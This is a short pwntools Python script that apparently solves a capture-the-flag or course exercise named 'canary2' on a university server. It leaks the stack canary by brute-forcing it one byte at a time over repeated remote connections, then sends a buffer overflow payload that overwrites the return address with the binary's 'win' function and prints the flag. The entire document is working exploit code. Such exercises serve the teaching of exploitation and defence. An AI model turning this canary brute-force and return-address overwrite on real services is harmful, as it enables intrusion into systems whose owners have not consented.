from pwn import *

host = 'lettieri.iet.unipi.it'
port = 4412
context.update(arch='amd64')
elf = ELF("canary2")

# 1st phase: leak the canary
offset = 0x200 - 8  # offset to the canary

context.log_level = 'error'
canary_bytes = b''
for j in range(8):
    for i in range(256):
        test_canary_bytes = canary_bytes + p8(i)
        print("".join([f"{c:02x}" for c in test_canary_bytes[::-1] ])+"\r", end="", flush="True")
        payload  = p32(offset + j + 1)
        payload += b'A' * offset
        payload += test_canary_bytes
        io = remote(host, port)
        io.send(payload)
        repl = io.recvall()
        io.close()
        if b"terminated" not in repl:
            canary_bytes = test_canary_bytes
            break
context.log_level = 'info'
canary = u64(canary_bytes)
log.success(f"canary: {canary:016x}")

# 2nd phase: win
payload = p32(offset + 3 * 8)
payload += b'A' * offset
payload += p64(canary)
payload += b'B' * 8
payload += p64(elf.symbols.win)
io = remote(host, port)
io.send(payload)
repl = io.recvuntil(b"flag:\n")
log.success(io.recvline().decode())
